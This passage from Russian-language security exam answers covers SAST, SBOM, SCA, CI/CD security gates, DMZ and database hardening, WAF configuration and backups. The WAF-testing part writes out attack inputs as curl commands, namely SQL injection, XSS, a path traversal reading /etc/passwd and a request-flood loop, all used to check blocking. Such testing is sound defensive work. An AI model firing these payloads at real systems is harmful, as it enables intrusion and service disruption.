- **F-measure** — баланс между precision и recall

---

### 163. Какие подходы используются для снижения false negatives?

**Ответ:** Подходы для снижения **false negatives** (пропущенных уязвимостей) в статическом анализе:

**1. Комбинация методов анализа:**
- SAST + DAST + IAST
- Различные инструменты с разными подходами
- Синергия методов

**2. Глубокий межпроцедурный анализ:**
- Анализ всех вызовов функций
- Отслеживание данных через модули
- Учёт сложных зависимостей

**3. Символьное выполнение:**
- Исследование всех путей выполнения
- Генерация тестов для покрытия путей
- Обнаружение сложных условий

**4. Фаззинг (Fuzzing):**
- Автоматическая генерация входных данных
- Обнаружение уязвимостей через динамическое тестирование
- Комбинация с символьным выполнением

**5. Абстрактная интерпретация:**
- Анализ всех возможных состояний
- Консервативные приближения
- Гарантии полноты

**6. Анализ на уровне нескольких языков:**
- Анализ серверной и клиентской частей
- Учёт взаимодействия компонентов
- Полное покрытие системы

**7. Обновление баз знаний:**
- Регулярное обновление правил
- Добавление новых паттернов уязвимостей
- Учёт последних атак

**8. Кастомные правила:**
```yaml
custom_rules:
  - pattern: "eval(${input})"
    severity: critical
    description: "Code injection vulnerability"
```

**9. Анализ зависимостей:**
- SCA (Software Composition Analysis)
- Обнаружение уязвимостей в библиотеках
- Анализ цепочки зависимостей

**10. Регулярные сканирования:**
- Непрерывный мониторинг
- Периодические глубокие сканирования
- Анализ изменений в коде

**11. Ручной аудит:**
- Code review с фокусом на безопасность
- Пентестинг
- Экспертный анализ

**12. Использование множественных инструментов:**
```python
# Комбинация инструментов
tools = [
    PVS_Studio(),
    Coverity(),
    SonarQube(),
    CodeQL()
]

results = []
for tool in tools:
    results.extend(tool.analyze(code))
```

**Метрики покрытия:**
- Покрытие кода анализом
- Покрытие классов уязвимостей (CWE)
- Количество обнаруженных vs реальных проблем

---

### 164. Что такое SBOM и какие форматы он использует?

**Ответ:** **SBOM (Software Bill of Materials)** — это структурированный список компонентов, библиотек и зависимостей, входящих в состав программного обеспечения, аналогичный списку ингредиентов для продуктов питания.

**Назначение:**
- Прозрачность состава ПО
- Управление уязвимостями
- Соответствие требованиям (например, Executive Order 14028 в США)
- Отслеживание лицензий

**Форматы SBOM:**

**1. SPDX (Software Package Data Exchange):**
- **Стандарт:** ISO/IEC 5962:2021
- **Формат:** JSON, YAML, XML, Tag-Value
- **Разработчик:** Linux Foundation

```json
{
  "SPDXID": "SPDXRef-DOCUMENT",
  "spdxVersion": "SPDX-2.3",
  "dataLicense": "CC0-1.0",
  "name": "Example Package",
  "packages": [
    {
      "SPDXID": "SPDXRef-Package-1",
      "name": "express",
      "versionInfo": "4.18.2",
      "downloadLocation": "https://npmjs.com/package/express"
    }
  ]
}
```

**2. CycloneDX:**
- **Формат:** JSON, XML
- **Разработчик:** OWASP
- **Особенности:** Фокус на безопасности

```json
{
  "bomFormat": "CycloneDX",
  "specVersion": "1.4",
  "components": [
    {
      "type": "library",
      "name": "express",
      "version": "4.18.2",
      "purl": "pkg:npm/express@4.18.2"
    }
  ]
}
```

**3. SWID (Software Identification Tags):**
- **Стандарт:** ISO/IEC 19770-2
- **Формат:** XML
- **Применение:** Инвентаризация ПО

**4. JSON (Custom):**
```json
{
  "components": [
    {
      "name": "package-name",
      "version": "1.0.0",
      "type": "library",
      "license": "MIT",
      "vulnerabilities": []
    }
  ]
}
```

**Генерация SBOM:**

```bash
# Для Node.js
npm install -g @cyclonedx/cyclonedx-npm
cyclonedx-npm --output-file sbom.json

# Для Python
pip install cyclonedx-bom
cyclonedx-py -o sbom.json

# Для Java/Maven
mvn org.cyclonedx:cyclonedx-maven-plugin:makeAggregateBom
```

**Использование:**
- Сканирование уязвимостей в зависимостях
- Управление лицензиями
- Соответствие требованиям безопасности
- Отслеживание цепочки поставок

---

### 165. Как работает SCA и как он интегрируется в CI/CD?

**Ответ:** **SCA (Software Composition Analysis)** — это процесс анализа открытого исходного кода и зависимостей на наличие известных уязвимостей.

**Как работает SCA:**

1. **Идентификация зависимостей:**
   - Парсинг файлов зависимостей (package.json, requirements.txt, pom.xml)
   - Построение дерева зависимостей
   - Определение всех используемых библиотек

2. **Проверка уязвимостей:**
   - Сопоставление с базой данных CVE
   - Проверка версий библиотек
   - Определение уровня критичности

3. **Анализ лицензий:**
   - Проверка совместимости лицензий
   - Обнаружение лицензионных конфликтов

4. **Генерация отчёта:**
   - Список уязвимостей
   - Рекомендации по обновлению
   - SBOM (Software Bill of Materials)

**Интеграция в CI/CD:**

**1. GitHub Actions:**
```yaml
name: SCA Scan

on: [push, pull_request]

jobs:
  sca:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      # Snyk
      - name: Run Snyk
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        with:
          args: --severity-threshold=high
      
      # WhiteSource / Mend
      - name: Mend Scan
        uses: whitesource/run-alerts@v1
        env:
          WS_APIKEY: ${{ secrets.WS_APIKEY }}
      
      # OWASP Dependency-Check
      - name: OWASP Dependency-Check
        run: |
          docker run --rm -v $PWD:/src owasp/dependency-check --scan /src --format SARIF
```

**2. GitLab CI:**
```yaml
include:
  - template: Security/Dependency-Scanning.gitlab-ci.yml

dependency_scanning:
  variables:
    DS_EXCLUDED_PATHS: "spec, test, tests"
    DS_ANALYZER_IMAGE_TAG: "3"
```

**3. Jenkins:**
```groovy
pipeline {
    agent any
    stages {
        stage('SCA') {
            steps {
                sh 'npm audit --json > audit-report.json'
                dependencyCheck additionalArguments: '--format JSON --format HTML'
            }
        }
    }
}
```

**4. Azure DevOps:**
```yaml
- task: WhiteSource@21
  inputs:
    cwd: '$(System.DefaultWorkingDirectory)'

- task: SnykSecurityScan@1
  inputs:
    serviceConnectionEndpoint: 'Snyk'
```

**5. Custom интеграция:**
```python
def sca_scan():
    # Сканирование зависимостей
    result = subprocess.run(['npm', 'audit', '--json'], capture_output=True)
    vulnerabilities = json.loads(result.stdout)
    
    # Проверка критических уязвимостей
    critical = [v for v in vulnerabilities if v['severity'] == 'critical']
    
    if critical:
        # Блокировка pipeline
        raise Exception("Critical vulnerabilities found!")
    
    # Генерация SBOM
    generate_sbom()
```

**Автоматические действия:**
- Блокировка развёртывания при критических уязвимостях
- Автоматическое создание issue
- Уведомления в Slack/Email
- Генерация SBOM

**Популярные инструменты SCA:**
- **Snyk** — облачный сервис
- **WhiteSource / Mend** — комплексное решение
- **OWASP Dependency-Check** — открытый инструмент
- **GitHub Dependabot** — встроенный в GitHub
- **GitLab Dependency Scanning** — встроенный в GitLab

---

### 166. Какие меры автоматического реагирования возможны при обнаружении уязвимости в pipeline?

**Ответ:** Меры автоматического реагирования при обнаружении уязвимостей в CI/CD pipeline:

**1. Блокировка развёртывания (Fail Pipeline):**
```yaml
- name: Security Gate
  run: |
    if [ "$(grep -c 'CRITICAL' sast-report.json)" -gt 0 ]; then
      echo "Critical vulnerabilities found!"
      exit 1  # Остановка pipeline
    fi
```

**2. Quarantine артефактов:**
```python
def quarantine_artifact(artifact, vulnerabilities):
    if has_critical_vulnerabilities(vulnerabilities):
        # Перемещение в карантин
        quarantine_storage.quarantine(artifact)
        # Блокировка развёртывания
        block_deployment(artifact)
```

**3. Создание issue/тикета:**
```python
def create_security_issue(vulnerability):
    github.create_issue(
        title=f"Security: {vulnerability['name']}",
        body=vulnerability['description'],
        labels=['security', 'critical'],
        assignees=['security-team']
    )
```

**4. Уведомления:**
```python
def send_alert(vulnerability):
    # Slack
    slack_client.send_message(
        channel='#security',
        text=f"Critical vulnerability found: {vulnerability['name']}"
    )
    
    # Email
    send_email(
        to='security-team@company.com',
        subject='Critical Security Alert',
        body=vulnerability['description']
    )
```

**5. Автоматическое создание pull request:**
```python
def auto_fix_dependency(vulnerability):
    # Автоматическое обновление уязвимой зависимости
    updated_version = get_fixed_version(vulnerability)
    update_dependency(vulnerability['package'], updated_version)
    
    # Создание PR
    create_pull_request(
        title=f"Security: Update {vulnerability['package']}",
        branch='security/auto-fix'
    )
```

**6. Откат развёртывания:**
```python
def auto_rollback(deployment, vulnerability):
    if is_production(deployment) and is_critical(vulnerability):
        rollback_deployment(deployment)
        notify_team("Deployment rolled back due to security issue")
```

**7. Автоматическое сканирование:**
```python
def trigger_deep_scan(vulnerability):
    # Запуск дополнительных проверок
    run_penetration_test()
    run_dynamic_scan()
```

**8. Интеграция с SIEM:**
```python
def send_to_siem(vulnerability):
    siem_client.send_event({
        'event_type': 'vulnerability_detected',
        'severity': vulnerability['severity'],
        'component': vulnerability['component'],
        'timestamp': datetime.now().isoformat()
    })
```

**9. Условная блокировка:**
```yaml
- name: Conditional Gate
  run: |
    critical_count=$(grep -c 'CRITICAL' report.json)
    if [ "$critical_count" -gt 5 ]; then
      exit 1  # Блокировка только при > 5 критических
    fi
```

**10. Автоматическое обновление:**
```python
def auto_update_dependencies():
    # Автоматическое обновление небезопасных зависимостей
    for vuln in critical_vulnerabilities:
        if auto_fix_available(vuln):
            update_dependency(vuln['package'], vuln['fixed_version'])
```

**Пример полного workflow:**
```yaml
security-scan:
  steps:
    - name: Run SAST
      run: sast-scan
    
    - name: Check Results
      run: |
        if has_critical_issues(); then
          create_issue()
          send_alert()
          exit 1  # Fail pipeline
        fi
    
    - name: Quarantine if needed
      if: has_high_issues()
      run: quarantine_artifact()
```

---

### 167. Какие инструменты подходят для анализа JavaScript и динамических языков?

**Ответ:** Инструменты для анализа JavaScript и динамических языков:

**JavaScript:**

**1. ESLint Security Plugin:**
- Обнаружение XSS, injection
- Проверка использования небезопасных функций
- Интеграция с ESLint

**2. Semgrep:**
- Поддержка JavaScript/TypeScript
- Правила для обнаружения уязвимостей
- Быстрый анализ

**3. Snyk Code:**
- SAST для JavaScript
- Обнаружение уязвимостей в коде
- Интеграция с IDE

**4. CodeQL:**
- Поддержка JavaScript/TypeScript
- Глубокий анализ
- Символьное выполнение

**5. SonarQube:**
- Анализ JavaScript/TypeScript
- Обнаружение уязвимостей
- Code smells

**Python:**

**1. Bandit:**
- Специализируется на безопасности Python
- Обнаружение типичных уязвимостей
- Простой в использовании

**2. Safety:**
- Проверка уязвимостей в зависимостях
- База данных известных уязвимостей
- Интеграция с CI/CD

**3. Semgrep:**
- Python правила
- Быстрый анализ
- Кастомные правила

**4. Pylint:**
- Общий анализ кода
- Плагины для безопасности
- Интеграция с IDE

**5. CodeQL:**
- Поддержка Python
- Глубокий анализ
- Обнаружение сложных уязвимостей

**Ruby:**

**1. Brakeman:**
- Специализируется на Ruby on Rails
- Обнаружение типичных уязвимостей Rails
- Быстрый анализ

**2. Semgrep:**
- Ruby правила
- Анализ Rails приложений

**PHP:**

**1. PHPStan Security Plugin:**
- Статический анализ PHP
- Обнаружение уязвимостей
- Интеграция с PHPStan

**2. Psalm:**
- Статический анализатор PHP
- Обнаружение ошибок
- Правила безопасности

**Особенности анализа динамических языков:**
- Сложность из-за динамической типизации
- Проблемы с анализом метапрограммирования
- Необходимость runtime информации

---

### 168. Какие инструменты используются для генерации тест-кейсов на основе символьного выполнения?

**Ответ:** Инструменты для генерации тест-кейсов через символьное выполнение:

**1. KLEE:**
- Символьное выполнение для LLVM
- Автоматическая генерация тестов
- Покрытие путей выполнения

**2. SAGE (Microsoft):**
- Автоматическая генерация тестов
- Фокус на обнаружении ошибок
- Использование в Microsoft

**3. angr:**
- Python framework
- Анализ бинарных файлов
- Генерация тестов

**4. CVC4 / Z3:**
- SMT-решатели
- Используются для генерации входных данных
- Основа для других инструментов

**5. Triton:**
- Binary analysis framework
- Символьное выполнение
- Генерация тестов для бинарников

**6. CREST:**
- Автоматическая генерация тестов для C
- Использование символьного выполнения
- Покрытие веток

**Принцип работы:**
1. Символьное выполнение программы
2. Создание ограничений для каждого пути
3. Решение ограничений SMT-решателем
4. Генерация конкретных входных данных

---

### 169. Какие инструменты подходят для верификации критических систем (авионика, энергетика)?

**Ответ:** Инструменты для верификации критических систем:

**1. Frama-C:**
- Дедуктивная верификация для C
- Формальные доказательства
- Применение в авионике

**2. SPARK (Ada):**
- Формальная верификация для Ada
- Применение в авионике
- Доказательство отсутствия ошибок

**3. Polyspace (MathWorks):**
- Статический анализ
- Верификация встраиваемых систем
- Применение в авионике, автомобилях

**4. Astrée:**
- Абстрактная интерпретация
- Применение в авионике
- Автоматическая верификация

**5. CBMC:**
- Модельная проверка
- Верификация C/C++ программ
- Применение в критических системах

**6. TLA+:**
- Спецификация и верификация
- Моделирование систем
- Применение в распределённых системах

**7. Isabelle / Coq:**
- Интерактивные доказательства
- Формальная верификация
- Высокий уровень гарантий

**Требования:**
- Формальные методы
- Доказательство корректности
- Соответствие стандартам (DO-178C, IEC 61508)
- Сертификация

---

### 170. Какие инструменты рекомендуются ФСТЭК для КИИ?

**Ответ:** ФСТЭК России рекомендует следующие инструменты для анализа ПО в КИИ:

**Российские инструменты:**
1. **Svaser** — российский статический анализатор
2. **PVS-Studio** — при наличии сертификации

**Требования ФСТЭК:**
- Соответствие ГОСТ Р 71207-2024
- Сертификация инструментов
- Поддержка российских стандартов
- Локализация инструментов

**Общие рекомендации:**
- Инструменты должны соответствовать требованиям безопасности
- Возможность верификации результатов
- Документирование процесса анализа
- Сохранение артефактов анализа

**Примечание:** Конкретный список рекомендуемых инструментов может изменяться, необходимо проверять актуальные рекомендации ФСТЭК.

---

### 171. Какие инструменты обеспечивают межпроцедурный анализ?

**Ответ:** Инструменты с межпроцедурным анализом:

**1. Coverity (Synopsys):**
- Глубокий межпроцедурный анализ
- Отслеживание данных через функции
- Высокая точность

**2. CodeSonar (GrammaTech):**
- Межпроцедурный анализ потока данных
- Обнаружение сложных уязвимостей
- Применение в критических системах

**3. PVS-Studio:**
- Межпроцедурный анализ для C/C++/C#/Java
- Отслеживание значений через функции
- Высокая точность

**4. Klocwork (Perforce):**
- Межпроцедурный анализ
- Обнаружение уязвимостей
- Интеграция с CI/CD

**5. Infer (Facebook):**
- Межпроцедурный анализ
- Абстрактная интерпретация
- Поддержка Java, C/C++, Objective-C

**6. CodeQL:**
- Межпроцедурные запросы
- Отслеживание данных через модули
- Глубокий анализ

**7. SonarQube:**
- Межпроцедурный анализ (ограниченный)
- Зависит от языка и правил

**Особенности межпроцедурного анализа:**
- Анализ вызовов функций
- Отслеживание параметров и возвращаемых значений
- Учёт побочных эффектов
- Анализ через границы модулей

---

### 172. Какие инструменты поддерживают CWE Top 25?

**Ответ:** Инструменты, поддерживающие CWE Top 25:

**1. Coverity:**
- Поддержка большинства CWE Top 25
- Глубокий анализ
- Высокая точность

**2. CodeSonar:**
- Покрытие CWE Top 25
- Специализация на критических системах

**3. PVS-Studio:**
- Обнаружение многих CWE Top 25
- Фокус на C/C++/C#/Java

**4. SonarQube:**
- Поддержка CWE через правила
- Зависит от языка

**5. Checkmarx:**
- Покрытие CWE Top 25
- Анализ веб-приложений

**6. Veracode:**
- Поддержка CWE Top 25
- SAST + DAST

**7. Semgrep:**
- Правила для CWE Top 25
- Настраиваемые правила

**CWE Top 25 включает:**
- CWE-787 (Out-of-bounds Write)
- CWE-79 (XSS)
- CWE-89 (SQL Injection)
- CWE-20 (Improper Input Validation)
- И другие критичные уязвимости

---

### 173. Что такое SARIF и зачем он нужен?

**Ответ:** **SARIF (Static Analysis Results Interchange Format)** — это стандартный формат (OASIS стандарт) для представления результатов статического анализа кода.

**Назначение:**
- Унификация формата результатов
- Интеграция инструментов
- Обмен результатами между системами

**Преимущества:**
- Стандартизация
- Совместимость инструментов
- Интеграция с CI/CD
- Визуализация результатов

**Структура SARIF:**
```json
{
  "version": "2.1.0",
  "runs": [{
    "tool": {
      "driver": {
        "name": "Example Tool"
      }
    },
    "results": [{
      "ruleId": "CWE-89",
      "level": "error",
      "message": {
        "text": "SQL Injection"
      },
      "locations": [...]
    }]
  }]
}
```

**Поддержка:**
- GitHub Security
- GitLab Security Dashboard
- Большинство SAST-инструментов
- CI/CD платформы

---

### 174. Какие CI/CD-платформы поддерживают встроенный SAST?

**Ответ:** CI/CD-платформы с встроенным SAST:

**1. GitHub:**
- **CodeQL** — встроенный SAST
- **Dependabot** — сканирование зависимостей
- **GitHub Advanced Security**

**2. GitLab:**
- **GitLab SAST** — встроенный анализатор
- **Security Dashboard**
- Интеграция с внешними инструментами

**3. Azure DevOps:**
- **Microsoft Security Code Analysis**
- Интеграция с SonarQube
- WhiteSource / Mend

**4. Jenkins:**
- Плагины для SAST
- Интеграция с различными инструментами
- Гибкая настройка

**5. CircleCI:**
- Орбиты для SAST
- Интеграция с Snyk, SonarQube

**6. Bitbucket Pipelines:**
- Интеграция с Snyk
- Поддержка внешних инструментов

---

### 175. Какие решения подходят для анализа открытых зависимостей (open-source)?

**Ответ:** Решения для анализа открытых зависимостей:

**1. Snyk:**
- Сканирование зависимостей
- Мониторинг уязвимостей
- Автоматические обновления

**2. WhiteSource / Mend:**
- Комплексное решение
- Управление лицензиями
- SBOM генерация

**3. OWASP Dependency-Check:**
- Открытый инструмент
- Локальное выполнение
- Поддержка множества форматов

**4. GitHub Dependabot:**
- Встроен в GitHub
- Автоматические PR
- Бесплатно

**5. GitLab Dependency Scanning:**
- Встроен в GitLab
- Автоматическое сканирование
- Интеграция с Security Dashboard

**6. npm audit / yarn audit:**
- Встроен в npm/yarn
- Быстрое сканирование
- Для JavaScript проектов

**7. Safety (Python):**
- Сканирование Python зависимостей
- База данных уязвимостей
- Интеграция с CI/CD

**Функции:**
- Обнаружение известных уязвимостей (CVE)
- Управление лицензиями
- Генерация SBOM
- Рекомендации по обновлению

---

## Источники:
- Документация инструментов статического анализа
- ГОСТ Р 71207-2024
- OWASP Tools and Standards
- NIST Guidelines
- Опыт использования инструментов в индустрии


# Ответы на вопросы к зачёту
## Раздел 8: Операционная безопасность и защита инфраструктуры

### 176. Как настроить демилитаризованную зону (DMZ)?

**Ответ:** Настройка **DMZ (Demilitarized Zone)** — изолированной сетевой зоны между внутренней сетью и интернетом для размещения публично доступных сервисов.

**Архитектура DMZ:**

```
Интернет
  ↓
[Firewall внешний]
  ↓
[DMZ] ← Публичные сервисы (веб-сервер, DNS, email)
  ↓
[Firewall внутренний]
  ↓
[Внутренняя сеть] ← Приватные сервисы
```

**Настройка с использованием iptables (Linux):**

```bash
# Внешний firewall
# Разрешить входящие соединения к DMZ
iptables -A FORWARD -i eth0 -o eth1 -d 10.0.1.0/24 -j ACCEPT
# Разрешить ответы из DMZ
iptables -A FORWARD -i eth1 -o eth0 -s 10.0.1.0/24 -j ACCEPT

# Внутренний firewall
# Разрешить исходящие из внутренней сети
iptables -A FORWARD -i eth2 -o eth1 -s 192.168.1.0/24 -d 10.0.1.0/24 -j ACCEPT
# Разрешить ответы в внутреннюю сеть
iptables -A FORWARD -i eth1 -o eth2 -s 10.0.1.0/24 -d 192.168.1.0/24 -j ACCEPT
# Запретить прямой доступ из DMZ во внутреннюю сеть
iptables -A FORWARD -i eth1 -o eth2 -s 10.0.1.0/24 -d 192.168.1.0/24 -j DROP
```

**Настройка с использованием pfSense:**

1. **Создание VLAN для DMZ:**
   - Интерфейсы → VLANs → Add
   - VLAN Tag: 100
   - Description: DMZ

2. **Настройка правил firewall:**
```bash
# WAN → DMZ (только необходимые порты)
Rule: Allow HTTP/HTTPS to DMZ Web Server
Source: Any
Destination: DMZ Web Server (10.0.1.10)
Port: 80, 443
Action: Allow

# DMZ → WAN (только исходящие ответы)
Rule: Allow DMZ to WAN responses
Source: DMZ
Destination: Any
Port: Any
Action: Allow

# LAN → DMZ (для администрации)
Rule: Allow Admin to DMZ
Source: Admin Network (192.168.1.0/24)
Destination: DMZ
Port: 22 (SSH)
Action: Allow

# DMZ → LAN (запрещено)
Rule: Block DMZ to LAN
Source: DMZ
Destination: LAN
Action: Block
```

**Настройка в облаке (AWS):**

```yaml
# CloudFormation example
Resources:
  PublicSubnet:
    Type: AWS::EC2::Subnet
    Properties:
      VpcId: !Ref VPC
      CidrBlock: 10.0.1.0/24
      AvailabilityZone: us-east-1a
  
  DMZSecurityGroup:
    Type: AWS::EC2::SecurityGroup
    Properties:
      GroupDescription: DMZ Security Group
      SecurityGroupIngress:
        - IpProtocol: tcp
          FromPort: 80
          ToPort: 80
          CidrIp: 0.0.0.0/0
        - IpProtocol: tcp
          FromPort: 443
          ToPort: 443
          CidrIp: 0.0.0.0/0
      SecurityGroupEgress:
        - IpProtocol: -1
          CidrIp: 0.0.0.0/0
```

**Принципы настройки DMZ:**

1. **Минимальные права:**
   - Только необходимые порты открыты
   - Запрещён прямой доступ из DMZ во внутреннюю сеть

2. **Изоляция:**
   - Отдельная подсеть для DMZ
   - Раздельные firewall правила

3. **Мониторинг:**
   - Логирование всего трафика DMZ
   - Алерты на подозрительную активность

4. **Резервирование:**
   - Дублирование критичных сервисов
   - Load balancing

---

### 177. Как настроить контроль доступа к базе данных?

**Ответ:** Настройка контроля доступа к базе данных включает несколько уровней:

**1. Аутентификация (Authentication):**

**PostgreSQL:**
```conf
# pg_hba.conf
# Локальные соединения
local   all             all                                     md5
# Сетевое соединение с паролем
host    all             all             127.0.0.1/32            md5
# Сетевое соединение через SSL
hostssl all             all             10.0.0.0/8              md5
```

**MySQL:**
```sql
-- Создание пользователя
CREATE USER 'app_user'@'10.0.1.%' IDENTIFIED BY 'strong_password';

-- Настройка политики паролей
SET GLOBAL validate_password.policy = STRONG;
SET GLOBAL validate_password.length = 12;
```

**2. Авторизация (Authorization):**

**PostgreSQL:**
```sql
-- Создание роли
CREATE ROLE readonly_role;

-- Предоставление прав на чтение
GRANT SELECT ON ALL TABLES IN SCHEMA public TO readonly_role;
GRANT SELECT ON ALL SEQUENCES IN SCHEMA public TO readonly_role;

-- Назначение роли пользователю
GRANT readonly_role TO app_user;

-- Принцип наименьших привилегий
REVOKE ALL ON DATABASE mydb FROM PUBLIC;
```

**MySQL:**
```sql
-- Предоставление минимальных прав
GRANT SELECT, INSERT ON mydb.users TO 'app_user'@'10.0.1.%';
GRANT SELECT ON mydb.products TO 'app_user'@'10.0.1.%';

-- Отзыв прав
REVOKE ALL PRIVILEGES ON *.* FROM 'app_user'@'10.0.1.%';
```

**3. Шифрование соединений:**

**PostgreSQL:**
```conf
# postgresql.conf
ssl = on
ssl_cert_file = '/etc/ssl/certs/server.crt'
ssl_key_file = '/etc/ssl/private/server.key'
```

**4. Сетевая изоляция:**

```bash
# Firewall правила
# Разрешить доступ только с application серверов
iptables -A INPUT -p tcp --dport 5432 -s 10.0.1.10 -j ACCEPT
iptables -A INPUT -p tcp --dport 5432 -j DROP
```

**5. Аудит доступа:**

**PostgreSQL:**
```conf
# postgresql.conf
log_connections = on
log_disconnections = on
log_statement = 'all'
log_line_prefix = '%t [%p]: [%l-1] user=%u,db=%d,app=%a,client=%h '
```

**6. Row-Level Security (RLS):**

```sql
-- Включение RLS
ALTER TABLE users ENABLE ROW LEVEL SECURITY;

-- Политика доступа
CREATE POLICY user_isolation ON users
    FOR ALL
    TO app_user
    USING (tenant_id = current_setting('app.tenant_id')::int);
```

**7. Connection Pooling с ограничениями:**

```yaml
# PgBouncer config
[databases]
mydb = host=localhost port=5432 dbname=mydb

[pgbouncer]
pool_mode = transaction
max_client_conn = 100
default_pool_size = 20
reserve_pool_size = 5
```

**8. Использование секретов:**

```yaml
# Kubernetes Secret
apiVersion: v1
kind: Secret
metadata:
  name: db-credentials
type: Opaque
data:
  username: YXBwX3VzZXI=  # base64 encoded
  password: c3Ryb25nX3Bhc3N3b3Jk
```

```python
# Использование секретов в приложении
import os
from cryptography.fernet import Fernet

db_user = os.getenv('DB_USER')
db_password = decrypt_secret(os.getenv('DB_PASSWORD_ENCRYPTED'))
```

**Рекомендации:**
- Принцип наименьших привилегий
- Регулярная ротация паролей
- Шифрование соединений (TLS)
- Аудит всех действий
- Ограничение сетевого доступа

---

### 178. Как настроить и проверить работу Web Application Firewall (WAF)?

**Ответ:** Настройка и проверка **WAF (Web Application Firewall)**:

**1. Настройка ModSecurity (Apache/Nginx):**

```apache
# Apache mod_security.conf
<IfModule mod_security2.c>
    SecRuleEngine On
    SecRequestBodyAccess On
    SecResponseBodyAccess On
    
    # База правил OWASP Core Rule Set
    Include /etc/modsecurity/crs-setup.conf
    Include /etc/modsecurity/rules/*.conf
    
    # Логирование
    SecAuditEngine RelevantOnly
    SecAuditLog /var/log/modsecurity/audit.log
</IfModule>
```

**2. Настройка AWS WAF:**

```yaml
# CloudFormation
Resources:
  WebACL:
    Type: AWS::WAFv2::WebACL
    Properties:
      Name: ProductionWebACL
      Scope: REGIONAL
      DefaultAction:
        Allow: {}
      Rules:
        - Name: AWSManagedRulesCommonRuleSet
          Priority: 1
          OverrideAction:
            None: {}
          Statement:
            ManagedRuleGroupStatement:
              VendorName: AWS
              Name: AWSManagedRulesCommonRuleSet
        - Name: RateLimitRule
          Priority: 2
          Action:
            Block: {}
          Statement:
            RateBasedStatement:
              Limit: 2000
              AggregateKeyType: IP
```

**3. Настройка Cloudflare WAF:**

```javascript
// Cloudflare Workers для кастомных правил
addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  // Проверка User-Agent
  const userAgent = request.headers.get('User-Agent')
  if (isMaliciousUserAgent(userAgent)) {
    return new Response('Forbidden', { status: 403 })
  }
  
  // Rate limiting
  const ip = request.headers.get('CF-Connecting-IP')
  if (await isRateLimited(ip)) {
    return new Response('Rate limited', { status: 429 })
  }
  
  return fetch(request)
}
```

**4. Проверка работы WAF:**

**Тест на SQL Injection:**
```bash
curl -X GET "https://example.com/search?q=1' OR '1'='1" \
  -H "User-Agent: Mozilla/5.0"
# Ожидаемый результат: 403 Forbidden или блокировка
```

**Тест на XSS:**
```bash
curl -X POST "https://example.com/comment" \
  -d "comment=<script>alert('XSS')</script>"
# Ожидаемый результат: Блокировка
```

**Тест на Path Traversal:**
```bash
curl "https://example.com/file?path=../../../etc/passwd"
# Ожидаемый результат: Блокировка
```

**Тест на Rate Limiting:**
```bash
# Множественные запросы
for i in {1..1000}; do
  curl "https://example.com/api/endpoint" &
done
# Ожидаемый результат: Блокировка после превышения лимита
```

**5. Мониторинг WAF:**

```python
import boto3
from datetime import datetime, timedelta

def check_waf_metrics():
    cloudwatch = boto3.client('cloudwatch')
    
    # Метрики блокировок
    response = cloudwatch.get_metric_statistics(
        Namespace='AWS/WAFV2',
        MetricName='BlockedRequests',
        Dimensions=[
            {'Name': 'WebACL', 'Value': 'ProductionWebACL'},
            {'Name': 'Rule', 'Value': 'AWSManagedRulesCommonRuleSet'}
        ],
        StartTime=datetime.utcnow() - timedelta(hours=1),
        EndTime=datetime.utcnow(),
        Period=300,
        Statistics=['Sum']
    )
    
    blocked_count = sum(point['Sum'] for point in response['Datapoints'])
    print(f"Blocked requests: {blocked_count}")
```

**6. Логирование и анализ:**

```bash
# Просмотр логов ModSecurity
tail -f /var/log/modsecurity/audit.log | grep "ModSecurity: Access denied"

# Анализ блокировок
grep "403" /var/log/nginx/access.log | \
  awk '{print $7}' | sort | uniq -c | sort -rn | head -10
```

**7. Настройка алертов:**

```yaml
# Alertmanager config для Prometheus
groups:
  - name: waf_alerts
    rules:
      - alert: HighWAFBlockRate
        expr: rate(waf_blocked_requests[5m]) > 10
        for: 5m
        annotations:
          summary: "High rate of WAF blocks detected"
```

**Критерии успешной настройки:**
- Блокировка известных атак (SQL Injection, XSS)
- Минимум false positives
- Мониторинг и алерты работают
- Логирование всех событий

---

### 179. Как настроить резервное копирование и восстановление (backup & restore)?

**Ответ:** Настройка резервного копирования и восстановления:

**1. Резервное копирование базы данных:**

**PostgreSQL:**
```bash
#!/bin/bash
# backup.sh
BACKUP_DIR="/backups/postgresql"
DATE=$(date +%Y%m%d_%H%M%S)
DB_NAME="mydb"

# Создание backup
pg_dump -h localhost -U backup_user -F c -b -v -f "$BACKUP_DIR/${DB_NAME}_${DATE}.backup" $DB_NAME

# Сжатие
gzip "$BACKUP_DIR/${DB_NAME}_${DATE}.backup"

# Удаление старых backup (старше 30 дней)
find $BACKUP_DIR -name "*.backup.gz" -mtime +30 -delete

# Загрузка в облако
aws s3 cp "$BACKUP_DIR/${DB_NAME}_${DATE}.backup.gz" \
  s3://backup-bucket/postgresql/
```

**Cron job:**
```cron
# Ежедневное резервное копирование в 2:00
0 2 * * * /usr/local/bin/backup.sh >> /var/log/backup.log 2>&1
```

**2. Восстановление:**

```bash
# Восстановление из backup
gunzip mydb_20240115_020000.backup.gz
pg_restore -h localhost -U postgres -d mydb_new -v mydb_20240115_020000.backup

# Восстановление из SQL dump
psql -h localhost -U postgres -d mydb < backup.sql
```

**3. Инкрементальное резервное копирование:**

**PostgreSQL WAL Archiving:**
```conf
# postgresql.conf
wal_level = replica
archive_mode = on
archive_command = 'test ! -f /backups/wal/%f && cp %p /backups/wal/%f'
```

**4. Резервное копирование файлов:**

```bash
#!/bin/bash
# files_backup.sh
SOURCE_DIR="/var/www"
BACKUP_DIR="/backups/files"
DATE=$(date +%Y%m%d_%H%M%S)

# Создание архива
tar -czf "$BACKUP_DIR/files_${DATE}.tar.gz" $SOURCE_DIR

# Проверка целостности
if tar -tzf "$BACKUP_DIR/files_${DATE}.tar.gz" > /dev/null; then
    echo "Backup verified successfully"
else
    echo "Backup verification failed!"
    exit 1
fi
```

**5. Автоматическое резервное копирование с уведомлениями:**

```python
import subprocess
import smtplib
from email.mime.text import MIMEText
from datetime import datetime

def backup_and_notify():
    try:
        # Выполнение backup
        result = subprocess.run(['/usr/local/bin/backup.sh'], 
                              capture_output=True, text=True)
        
        if result.returncode == 0:
            send_email("Backup successful", "Backup completed successfully")
        else:
            send_email("Backup failed", result.stderr)
    except Exception as e:
        send_email("Backup error", str(e))

def send_email(subject, body):
    msg = MIMEText(body)
    msg['Subject'] = subject
    msg['From'] = 'backup@example.com'
    msg['To'] = 'admin@example.com'
    
